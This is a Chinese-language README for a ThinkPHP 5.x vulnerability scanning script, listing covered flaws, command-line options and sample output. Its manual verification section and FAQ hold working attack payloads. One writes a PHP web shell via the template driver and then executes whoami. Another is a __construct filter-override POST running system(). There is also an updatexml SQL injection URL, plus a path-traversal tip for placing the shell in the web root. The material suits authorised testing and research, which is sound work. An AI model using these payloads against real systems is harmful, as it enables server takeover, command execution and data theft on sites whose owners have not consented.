# ThinkPHP 5.x 综合漏洞检测脚本

## 覆盖范围

三大攻击面 + 8 项检测，覆盖 ThinkPHP 5.0.x ~ 5.1.x：

| 攻击面 | 检测项 | CVE/原理 | 影响版本 |
|--------|--------|----------|----------|
| A | invokefunction 路由 RCE | CVE-2018-25270 | 5.0.5 ~ 5.0.23 |
| A | Request::input / Container RCE | 未强制路由 | 5.1.0 ~ 5.1.31 |
| A | template 写入 Getshell | 模板驱动写 shell | 5.1.x |
| B | `__construct` 变量覆盖 (无敌模式) | filter 注入 | ≤5.0.13 |
| B | `__construct` 变量覆盖 (debug) | filter 注入 | 5.0.14 ~ 5.0.23 |
| B | `__construct` 变量覆盖 (captcha) | captcha 路由绕过 | 5.0.14 ~ 5.0.23 |
| B | `__construct` 变量覆盖 (5.1) | filter 注入 | 5.1.0 ~ 5.1.16 |
| — | 模板驱动文件包含 | CVE-2025-63888 | 5.0.24 / 5.x |
| — | routecheck 路径穿越 | CVE-2025-50706 | 5.1.x ≤ 5.1.41 |
| — | Cache 文件写入 Getshell | 缓存驱动写文件 | 5.0.x / 5.1.x |
| — | 多语言 pearcmd RCE | 2024 披露 | 5.0.x / 5.1.x / 6.0.x |
| — | parseOrder SQL 注入 | Builder.php | 5.0.x ~ 5.1.22 |

## 环境要求

- Python 3.6+
- `pip install requests urllib3`

## 使用方法

```bash
# 全量检测（推荐）
python thinkphp5_check.py -u http://192.168.1.100:8080

# 仅检测 RCE，跳过 SQL 注入
python thinkphp5_check.py -u http://192.168.1.100:8080 --rce-only

# 跳过置信度较低的检测（CVE-2025-63888/50706/多语言）
python thinkphp5_check.py -u http://192.168.1.100:8080 --skip-low-confidence

# 自定义超时（默认 10s）
python thinkphp5_check.py -u http://192.168.1.100:8080 --timeout 15

# 无彩色输出
python thinkphp5_check.py -u http://192.168.1.100:8080 --no-color
```

## 读取结果

返回示例：
```
[0] 指纹检测
  [+] 确认为 ThinkPHP (特征: thinkphp)

[2] 攻击面A-5.1: Request::input / Container RCE
  [!] 5.1 template 写入 — shell 写入成功并可访问!

[3] 攻击面B: __construct 变量覆盖 RCE
  [!] b1-captcha 路由 (≤5.0.13) — 确认存在!
```

- `[+]` — 信息确认（指纹、功能探测）
- `[!]` — **漏洞命中**，需要关注
- `[-]` — 未发现

## 命中后手动验证

### template 写入 RCE

浏览器访问以下地址写入 shell：
```
http://目标IP:端口/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C%3Fphp%20system($_GET[1])%3B%3F%3E
```
然后访问执行命令：
```
http://目标IP:端口/shell.php?1=whoami
```

### __construct 覆盖 RCE

POST 请求：
```
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&get[]=whoami
```

### SQL 注入验证

浏览器直接访问：
```
http://目标IP:端口/index.php?order[id`|updatexml(1,concat(0x7e,database()),1)%23]=1
```
页面出现 `XPATH syntax error` 后面跟数据库名即确认。

## 常见问题

**Q: 目标确认是 ThinkPHP 但所有检测都未命中？**

可能是：
1. 开启了强制路由 — 攻击面 A 失效，尝试攻击面 B
2. 非 5.x 版本 — ThinkPHP 3.x 或 6.x 用不同 payload
3. 有 WAF 拦截 — 尝试 `--skip-low-confidence` 排除干扰

**Q: template 写入提示成功但访问不到 shell？**

默认写到 `runtime/temp/`，不在 web 根目录。使用路径穿越写入 web 根：
```
cacheFile=../public/shell.php
```

**Q: 误报怎么判断？**

脚本用随机 token 验证命令执行结果。如果结果中出现了随机 token 才判定命中，误报率很低。唯一例外是多语言和文件包含模块（已标记置信度较低），建议手动验证。

## 免责声明

仅限授权安全测试、CTF 竞赛、靶场练习、教育研究使用。使用者自行承担一切责任。
